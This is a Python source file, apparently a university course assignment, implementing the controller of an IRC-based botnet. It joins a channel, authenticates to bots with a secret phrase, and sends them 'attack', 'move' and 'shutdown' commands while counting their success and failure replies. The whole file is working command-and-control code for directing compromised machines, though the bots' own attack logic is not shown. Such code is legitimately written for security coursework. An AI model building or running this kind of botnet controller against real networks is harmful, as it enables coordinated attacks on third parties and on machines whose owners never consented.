#!/usr/bin/env python3
#Harold MacDonald 10134954 T02
#Partner Justin Currie Leslie

#Imports
import sys, os, socket, time
import threading, _thread


class conbot():

    def __init__(self, hostname, port, channel, secretPhrase):
        self.hostname = hostname
        self.port = port
        self.channel = channel
        self.secretPhrase = secretPhrase
        self.nickName = "ContraMaster"
        self.ircChannel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bots = []
        self.botsAttackSuccess = []
        self.botsAttackFail = []
        self.botsMoved = []
        self.botsLeaving = []

    def __str__(self):
        return (self.hostname + " " + str(self.port) + " " + self.channel + " " + self.secretPhrase + " "  + self.nickName)

    def __repr__(self):
        return (self.hostname + " " + self.port + " " + self.channel + " " + self.secretPhrase + " "  + self.nickName)
               
    def run(self):
        self.connectToServer()       
        _thread.start_new_thread(self.recv, ())
        self.send()
            

    def recv(self):
        readbuffer = ""
        master = ""
        while 1:
            self.transmit("JOIN #" + self.channel)
            readbuffer = self.ircChannel.recv(1024)
            incomingMessage = readbuffer.decode("UTF-8").split("\n")
            for line in incomingMessage:
                line = line.rstrip()
                name = self.getUserName(line)
                line = line.split(" ")
                if (line[0] == "PING"):
                        self.pong(line[1])
                if ("PRIVMSG" in line) and (":Checking" in line) and ("in!" in line):
                    self.bots.append(name)
                    continue
                if ("PRIVMSG" in line) and (":success" in line):
                    self.botsAttackSuccess.append(name)
                if ("PRIVMSG" in line) and (":failure" in line):
                    self.botsAttackFail.append(name)
                if ("PRIVMSG" in line) and (":Changing" in line):
                    self.botsMoved.append(name)
                if ("PRIVMSG" in line) and (":Good-bye!" in line):
                    self.botsLeaving.append(name)
                
                

    def send(self):
        while 1:
            self.issueCommands()
    
    def issueCommands(self):
        command = input("command: ")
        if (command in self.secretPhrase):
            self.sendToChannel(command)
            _thread.start_new_thread(self.requestStatus, ())
        if ("status" in command) :
            numBots = len(self.bots)
            print ("Found " + str(numBots) + " bots: " + self.printBotNet())
        elif ("attack" in command) and (len(command.split()) == 3):
            self.botNetAttack(command)
        elif ("move" in command) and (len(command.split()) == 4):
            self.botNetMove(command)
        elif ("shutdown" in command):
            self.shutBotNotDown()
        elif ("quit" in command):
            self.sendToChannel("/QUIT")
            sys.exit(1)
        else:
            self.sendToChannel(command)


    def requestStatus(self):
        while True:
            self.bots = []
            self.sendToChannel("status")
            time.sleep(5)

    def botNetAttack(self, command):
        self.sendToChannel(command)
        time.sleep(5)
        print("total: " + str(len(self.botsAttackSuccess)) + " successful, " + str(len(self.botsAttackFail)) + " unsuccessful" )
        self.printBotNetAction("successful", self.botsAttackSuccess)
        self.printBotNetAction("failed", self.botsAttackFail)
        self.botsAttackSuccess = []
        self.botsAttackFail = []

    def botNetMove(self, command):
        self.sendToChannel(command)
        time.sleep(5)
        print("Total bots moved: " + str(len(self.botsMoved)))
        self.printBotNetAction("Successful move by:", self.botsMoved)
        self.botsMoved = []

    def shutBotNotDown(self):
        numbOfbots = len(self.bots)
        self.sendToChannel("shutdown")
        time.sleep(5)
        numbOfbots = numbOfbots - len(self.bots)
        print("Total bots shutdown: " + str(numbOfbots))
        self.printBotNetAction ("Shutting down:", self.botsLeaving)        
        self.botsLeaving = []

    def printBotNet(self):
        botList = ""
        for babyBot in self.bots:
            botList = botList + babyBot + " "
        return botList

    def printBotNetAction(self, result, bots):
        for babyBot in bots:
            print (result + " " + babyBot)


    def getUserName(self, toParse):
        name = toParse.split("!")
        return name[0][1:]


    def sendToUser(self, user, message):
        myMsg = ("PRIVMSG " + user + " :" + message)
        self.transmit(myMsg)
    
    def sendToChannel(self, message):
        myMsg = ("PRIVMSG #" + self.channel + " :" + message)
        self.transmit(myMsg)

    def transmit(self, message):
        myMsg = bytes(message + "\n", "UTF-8")
        self.ircChannel.send(myMsg)

    def connectToServer(self):
        print("Connecting to: " + self.hostname)
        self.ircChannel.connect((self.hostname, int(self.port)))
        self.transmit("NICK " + self.nickName + " " + self.nickName + " " + self.nickName + " :" + self.nickName  )
        self.transmit("USER " + self.nickName + " " + self.hostname + " " + self.nickName + " :" + self.nickName)
        print("connected to server")

    def pong(self, returnMsg):
        self.transmit("PONG " + returnMsg)


if __name__ == "__main__":
    numberOfArgs = len(sys.argv)
    if (numberOfArgs == 5):
        hostname = sys.argv[1]
        port = sys.argv[2]
        channel = sys.argv[3]
        secretPhrase = ":" + sys.argv[4]
    else:
        print("Invalid number of arguments!")
        exit()
    
    aBot = conbot(hostname, int(port), channel, secretPhrase)
    aBot.run()

